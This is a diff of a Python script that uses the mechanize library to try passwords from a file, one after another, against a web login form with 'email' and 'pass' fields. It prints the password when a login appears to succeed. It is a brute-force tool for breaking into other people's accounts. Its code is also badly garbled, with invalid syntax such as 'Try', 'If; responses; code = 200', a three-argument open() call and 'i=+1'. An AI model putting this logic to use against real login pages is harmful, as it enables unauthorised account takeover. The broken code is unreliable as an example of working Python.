@@ -1,17 +1,11 @@
-from http.client import responses
+import response
 import sys 
 import os
 import time
 import mechanize 
 if sys.version_info[0] !=3:
-   print(' Required version of python3 .follow the usage procedures else contact the dev')
-   sys.exit()
-try:
-    import tokenize
-    
-except:
-    print('\n\tplease do install tokenize\n')
-sys.exit() 
+   print('\033[1;31m WARNING : RUN WITH PYTHON3\033[1;0m')
+
 import code
 import fileinput
 
@@ -50,10 +44,10 @@ i=0
 while file:
     file=open('password.txt','o','r' )
     password=file.readline().strip()
-    i+=1
-    if len(password) < 10:
-     print=str(i) +" : ",password
-    continue
+    i=+1
+    if len(password) < 7:
+        continue
+    print=str(i) +" : ",password
 excepthandler
 
 ConnectionError
@@ -61,10 +55,10 @@ ConnectionError
 Try
 print('\033[1;31mNO INTERNET CONNECTION OR CONNECTION TIMEOUT\033[1;0m')
 
-request = web.open()
+request = web.open(urlopen)
 Try
  
-If; responses; code = 200
+If; response; code = 200
 web.select_form(nr=0)()
 web.form['email']=email
 web.form['pass']=password
@@ -74,7 +68,6 @@ response_data = response.read()
 print("your password is : ",password)
 Break
 
-sys.exit()
 
 
 
